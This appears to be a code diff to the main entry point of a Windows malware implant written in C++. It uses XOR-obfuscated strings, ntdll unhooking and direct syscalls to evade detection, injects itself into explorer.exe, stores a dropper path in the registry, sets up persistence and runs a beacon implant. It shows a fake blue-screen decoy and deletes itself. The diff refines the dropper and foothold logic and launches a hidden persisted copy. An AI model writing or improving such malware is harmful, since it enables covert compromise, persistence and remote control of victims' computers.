@@ -14,14 +14,16 @@
 #include <vector>
 #include <algorithm>
 #include <cwctype>
-#include <thread>
 
 namespace {
     // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
     std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
 
-    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
-    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x38\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
+    // "svchost.exe" -> \x29\x2C\x39\x32\x35\x29\x2E\x74\x3F\x22\x3F
+    std::wstring kSvchost = L"\x29\x2C\x39\x32\x35\x29\x2E\x74\x3F\x22\x3F";
+
+    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
+    std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
 
     // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
     std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
@@ -42,18 +44,16 @@ namespace {
 
     bool IsSystemProcess(const std::wstring& sPath) {
         if (sPath.find(utils::DecryptW(kExplorer)) != std::wstring::npos) return true;
-        // "svchost.exe" -> \x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F
-        if (sPath.find(utils::DecryptW(L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F")) != std::wstring::npos) return true;
+        if (sPath.find(utils::DecryptW(kSvchost)) != std::wstring::npos) return true;
         return false;
     }
 
     bool IsRunningFromPersistLocation(const std::wstring& sPath) {
-        // Robust check: Is it in AppData or ProgramData AND NOT in Temp?
-        bool inAppData = (sPath.find(L"\\appdata\\local\\") != std::wstring::npos || sPath.find(L"\\appdata\\roaming\\") != std::wstring::npos);
-        bool inProgramData = (sPath.find(L"\\programdata\\") != std::wstring::npos);
-        bool inTemp = (sPath.find(L"\\temp\\") != std::wstring::npos || sPath.find(L"\\tmp\\") != std::wstring::npos);
-
-        if ((inAppData || inProgramData) && !inTemp) return true;
+        if (sPath.find(L"\\appdata\\local\\") != std::wstring::npos || sPath.find(L"\\appdata\\roaming\\") != std::wstring::npos || sPath.find(L"\\programdata\\") != std::wstring::npos) {
+            if (sPath.find(L"\\temp\\") == std::wstring::npos && sPath.find(L"\\tmp\\") == std::wstring::npos) {
+                return true;
+            }
+        }
         return false;
     }
 }
@@ -61,7 +61,6 @@ namespace {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
-    // 1. Unhook immediately
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
@@ -73,26 +72,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     LOG_INFO("--- WINMAIN ---");
     LOG_INFO("PATH: " + utils::ws2s(currentPath));
 
-    Sleep(10000 + (GetTickCount() % 10000));
-
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) return 1;
 
     if (IsSystemProcess(currentPath)) {
         LOG_INFO("ROLE: Foothold.");
-
         wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                 LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
-                Sleep(30000);
+                Sleep(15000);
                 persistence::establishPersistence(dropperPath);
             }
             RegCloseKey(hKey);
         }
-
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
@@ -107,45 +102,41 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // Dropper instance
+    // Dropper
     LOG_INFO("ROLE: Dropper.");
-
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
-        LOG_INFO("IPC: Stored path.");
     }
 
     std::vector<uint8_t> selfImage = GetSelfImage();
-    bool relocated = false;
     if (!selfImage.empty()) {
         LOG_INFO("Attempting relocation...");
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
             LOG_INFO("Relocation success.");
-            relocated = true;
+            decoy::ShowBSOD();
+            CoUninitialize();
+            utils::SelfDeleteAndExit();
+            return 0;
         }
     }
 
-    if (relocated) {
-        decoy::ShowBSOD();
-        CoUninitialize();
-        utils::SelfDeleteAndExit();
-        return 0;
+    LOG_WARN("Relocation failed. Dropping stable copy...");
+    std::wstring persistPath = persistence::establishPersistence();
+    if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
+        LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
+        STARTUPINFOW si; PROCESS_INFORMATION pi;
+        RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
+        if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            LOG_INFO("Stable copy active.");
+        } else {
+            LOG_ERR("Launch stable copy fail. Error: " + std::to_string(GetLastError()));
+        }
     }
 
-    LOG_WARN("Relocation failed. Becoming beacon.");
-    persistence::establishPersistence();
-
-    // Run beacon in background during BSOD
-    std::thread beaconThread([]() {
-        beacon::Beacon implant;
-        implant.run();
-    });
-    beaconThread.detach();
-
     decoy::ShowBSOD();
-
     CoUninitialize();
     utils::SelfDeleteAndExit();
     return 0;
